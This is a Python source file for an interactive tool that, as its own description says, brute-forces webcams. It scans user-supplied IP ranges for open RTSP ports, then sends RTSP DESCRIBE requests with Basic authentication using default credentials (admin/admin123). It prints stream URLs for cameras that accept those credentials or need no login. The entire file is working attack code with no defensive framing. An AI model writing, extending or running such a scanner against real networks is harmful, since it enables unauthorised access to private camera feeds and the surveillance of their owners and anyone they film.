import socket
import tqdm
import threading
import base64
import re
import queue
import time
from pathlib import Path

about = "bruteforcing webcams by http/https"
class main(object):
    def __init__(self):
        self.running = True
        self.ip_ranges = []
        self.founded_targets = []
        self.port = 554
        self.timeout = 2
        
    def run(self):
        while self.running:
            command = input("$[ IpCams ]>> ")
            command = command.split(" ")
            
            if command[0] == "set":
                match (command[1]):
                    case "ip_ranges":
                        self.ip_ranges = command[2].split(",")
                    case "port":
                        self.port = int(command[2])
                    case "timeout":
                        self.port = int(command[2])
            if command[0] == "show":
                print(f"ip_ranges: {str(self.ip_ranges)}", end="\n")
                print(f"founded_targets: {str(len(self.founded_targets))}", end="\n")
                print(f"port: {str(self.port)}", end="\n")
                print(f"timeout: {str(self.timeout)}", end="\n")
            
            if command[0] == "run":
                
                if len(command) != 2:
                    print("run scan/brute")
                else:        
                    if command[1] == "scan":
                        self.module_scan_run()
                        
                    if command[1] == "brute":
                        self.module_brute_run()
                    
            if command[0] == "save_targets":
                with open("scan_result.txt", "w") as f:
                    for ip in self.founded_targets:
                        f.write(f"{ip}\n")
                    f.close
                    print("Done")
            if command[0] == "quit":
                return 0
            
    def module_scan_run(self):
        for ip_range in self.ip_ranges: 
            self.scan_for_targets(ip_range)
    
    def module_brute_run(self):
        if len(self.founded_targets) > 0:
            for ip in self.founded_targets:
                RtspBrute(ip, "admin", "admin123", self.port ).run()
            
     
    def scan_for_targets(self, ip_range):
        range_start_end = ip_range.split("-")
        start_ip = range_start_end[0].split(".") 
        end_ip =  range_start_end[1].split(".") 
        ips = list()
        for a in range(int(start_ip[0]), int(end_ip[0])+1):
            for b in range(int(start_ip[1]), int(end_ip[1])+1):
                for c in range(int(start_ip[2]), int(end_ip[2])+1):
                    for d in range(int(start_ip[3]), int(end_ip[3])+1):
                        ips.append(f'{str(a)}.{str(b)}.{str(c)}.{str(d)}')
        threads = []
        for num in range(0,len(ips)):
            threads.append(threading.Thread(target=self.port_check, args=(ips[num], int(self.port))))
                
        for thread in range(0,len(threads)):
            threads[thread].start()
            
        for thread in tqdm.tqdm(range(0,len(threads))):    
            threads[thread].join()
                        
    def port_check(self,ip, port):
        target = socket.gethostbyname(ip)
        socket.setdefaulttimeout(self.timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ans = s.connect_ex((target,port))
        s.close()
        if ans == 0:
            self.founded_targets.append(ip)
            
            

class RtspBrute(object):
    def __init__(self, target, username, password, port):
        self.port = port
        self.targetlist = self.param_to_list(target, method='target')
        self.usernamelist = self.param_to_list(username)
        self.passwordlist = self.param_to_list(password)

    def run(self):
        threads = 100
        global q
        q = queue.Queue()
        for _target in self.targetlist:
            q.put(_target)

        threads = min(len(self.targetlist), threads)
        _threads = []
        for i in range(threads):
            t = threading.Thread(target=self.brute_force, args=())
            _threads.append(t)
        for t in _threads:
            t.setDaemon(True)
            t.start()
        for t in _threads:
            t.join()

    def vaild_target(self, target):
        regex = re.compile(
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        result = re.search(regex, target)
        if result:
            return result[0]
        else:
            return None

    def param_to_list(self, param, method=""):
        list = set()
        path = Path(param)
        if path.exists() and path.is_file():
            with open(path, encoding='utf-8', errors='ignore') as file:
                for line in file:
                    if method == "":
                        list.add(line.strip())
                    elif method == "target":
                        line = self.vaild_target(line.strip())
                        list.add(line.strip() + ":" + str(self.port))
            return list
        else:
            if method == "":
                list = param.split(',')
            elif method == "target":
                list = param.split(',')
                for i in range(len(list)):
                    list[i] = list[i]+':'+str(self.port)
            return list

    def rtsp_request(self, target, username="", password=""):
        if username:
            auth = username + ":" + password
            auth_base64 = base64.b64encode(auth.encode()).decode()
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {}\r\n\r\n".format(target,auth_base64)
        else:
            req = "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\n\r\n".format(
                target)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target.split(":")[0], int(target.split(":")[1])))
            s.sendall(req.encode())
            data = s.recv(1024).decode()
            return data

        except KeyboardInterrupt:
            return
        except (socket.timeout, TimeoutError):
            return
        except (socket.error, OSError):
            return

    def brute_force(self):
        while not q.empty():
            target = q.get()
            # print(target)
            data = self.rtsp_request(target=target)
            if data:
                if "401 Unauthorized" in data:
                    # print("401 Unauthorized")
                    for username in self.usernamelist:
                        for password in self.passwordlist:
                            # print(password)
                            if "WWW-Authenticate: Basic" in data:
                                data = self.rtsp_request(
                                    target, username, password)
                                if "200 OK" in data:
                                    print(
                                        "rtsp://{}@{}:{}".format(username, password, target ))
                                    pass
                                if "401 Unauthorized" in data:
                                    time.sleep(1)
                                    # print("401 Unauthorized")
                                    continue
                    pass
                elif "200 OK" in data:
                    print(f"No AUTH: rtsp://{target}")
                else:
                    pass
                    # print("Unkonwn problem from %s" % target)
                    # print(data)

            else:
                pass
        pass